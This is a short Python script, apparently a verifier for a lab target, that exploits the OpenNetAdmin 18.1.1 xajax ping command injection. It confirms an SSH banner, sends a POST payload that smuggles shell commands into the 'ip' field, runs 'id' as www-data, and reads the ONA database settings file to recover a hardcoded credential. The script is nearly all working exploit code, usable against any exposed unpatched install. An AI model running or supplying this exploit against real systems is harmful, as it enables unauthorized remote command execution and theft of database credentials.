#!/usr/bin/env python3
"""Independent attacker: authentic OpenNetAdmin xajax RCE and DB credential discovery."""
import socket
import requests

BASE = "http://openadmin-target"
with socket.create_connection(("openadmin-target", 22), timeout=6) as sock:
    assert sock.recv(160).startswith(b"SSH-2.0-"), "OpenSSH banner missing"

page = requests.get(BASE + "/ona/", timeout=12)
assert page.status_code == 200 and "v18.1.1" in page.text, "Authentic OpenNetAdmin 18.1.1 not exposed"

def rce(command):
    form = 'ip=>;echo "BEGIN";{};echo "END"'.format(command)
    data = [
        ("xajax", "window_submit"),
        ("xajaxr", "1574117726710"),
        ("xajaxargs[]", "tooltips"),
        ("xajaxargs[]", form),
        ("xajaxargs[]", "ping"),
    ]
    response = requests.post(BASE + "/ona/", data=data, timeout=12)
    assert response.status_code == 200, f"xajax request failed: {response.status_code}"
    assert "BEGIN" in response.text and "END" in response.text, response.text[:700]
    return response.text.split("BEGIN", 1)[1].split("END", 1)[0]

identity = rce("id")
assert "uid=33(www-data)" in identity, f"RCE did not execute as www-data: {identity[:500]}"
config = rce("cat /opt/ona/www/local/config/database_settings.inc.php")
assert "n1nj4W4rri0R!" in config and "ona_sys" in config, "ONA database credential not discoverable"
print("PASS: HTTP/SSH recon -> authentic ONA 18.1.1 -> original xajax ws_ping shell_exec injection -> www-data -> DB credential")
